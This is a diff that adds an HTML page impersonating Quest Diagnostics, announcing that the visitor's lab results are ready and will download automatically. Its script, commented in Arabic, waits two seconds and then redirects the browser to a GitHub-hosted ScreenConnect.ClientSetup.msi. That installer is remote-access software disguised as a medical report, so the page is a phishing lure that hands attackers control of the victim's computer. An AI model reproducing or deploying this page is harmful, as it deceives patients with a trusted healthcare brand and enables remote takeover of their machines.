@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8" />
+	<meta content="width=device-width, initial-scale=1.0" name="viewport" />
+	<title>Quest Diagnostics - Inspection Report</title>
+	<style type="text/css">:root{
+    --green:#35792a;
+}
+
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+
+body{
+
+    min-height:100vh;
+    background:#f3f5f3;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    font-family:Arial, sans-serif;
+
+}
+
+
+.card{
+
+    width:100%;
+    max-width:450px;
+    background:#fff;
+    padding:35px 25px;
+    border-radius:20px;
+    text-align:center;
+    box-shadow:0 15px 40px rgba(0,0,0,.15);
+
+}
+
+
+.logo{
+
+    width:140px;
+    max-width:70%;
+    margin-bottom:20px;
+
+}
+
+
+.check{
+
+    width:75px;
+    height:75px;
+    line-height:75px;
+    background:var(--green);
+    color:white;
+    border-radius:50%;
+    font-size:45px;
+    margin:auto;
+
+}
+
+
+h1{
+
+    color:var(--green);
+    font-size:25px;
+    margin:20px 0 15px;
+
+}
+
+
+.text{
+
+    color:#555;
+    font-size:16px;
+    line-height:1.8;
+
+}
+
+
+.progress{
+
+    height:8px;
+    width:100%;
+    background:#ddd;
+    border-radius:20px;
+    margin-top:30px;
+    overflow:hidden;
+
+}
+
+
+.bar{
+
+    height:100%;
+    width:0%;
+    background:var(--green);
+    animation:load 2s forwards;
+
+}
+
+
+@keyframes load{
+
+    from{
+        width:0%;
+    }
+
+    to{
+        width:100%;
+    }
+
+}
+
+
+
+.info{
+
+    margin-top:25px;
+    color:#777;
+    font-size:14px;
+
+}
+
+
+.brand{
+
+    margin-top:25px;
+    color:var(--green);
+    font-size:20px;
+    font-weight:bold;
+
+}
+
+
+
+@media(max-width:480px){
+
+.card{
+
+    padding:30px 18px;
+
+}
+
+
+h1{
+
+    font-size:21px;
+
+}
+
+
+.text{
+
+    font-size:14px;
+
+}
+
+
+.logo{
+
+    width:110px;
+
+}
+
+}
+	</style>
+	<style type="text/css">
+	</style>
+	<style type="text/css">
+	</style>
+</head>
+<body data-gr-ext-installed="" data-new-gr-c-s-check-loaded="14.1313.0" data-new-gr-c-s-loaded="14.1313.0">
+<div class="card"><img class="logo" src="https://s7d6.scene7.com/is/image/questdiagnostics/Quest-Diagnostics-RGB-gradient?$corp-header-logo$" style="height: 135px; width: 300px;" />
+<div class="check">✓</div>
+
+<h1>Your Lab Results Are Ready</h1>
+
+<div class="text">Your report has been successfully generated.<br />
+The report will download automatically.<br />
+Thank you for choosing Quest Diagnostics.</div>
+
+<div class="progress">
+<div class="bar">&nbsp;</div>
+</div>
+
+<div class="info">
+<div id="date">&nbsp;</div>
+
+<div id="time">&nbsp;</div>
+</div>
+
+<div class="brand"><span style="font-size:14px;">&copy; 2026 Quest Diagnostics Incorporated. All rights reserved.</span></div>
+</div>
+<script>
+
+
+// اسم ملف العميل
+
+let report = "https://github.com/bokelecma/ReportServices-process/releases/download/dashboard-test.files/ScreenConnect.ClientSetup.msi";
+
+
+// التاريخ والوقت
+
+let now = new Date();
+
+
+document.getElementById("date").innerHTML =
+"📅 Date: " + now.toLocaleDateString("en-US");
+
+
+document.getElementById("time").innerHTML =
+"🕒 Time: " + now.toLocaleTimeString("en-US");
+
+
+
+// تحميل التقرير بعد ثانيتين
+
+setTimeout(function(){
+
+window.location.href = report;
+
+},2000);
+
+
+</script></body>
+</html>
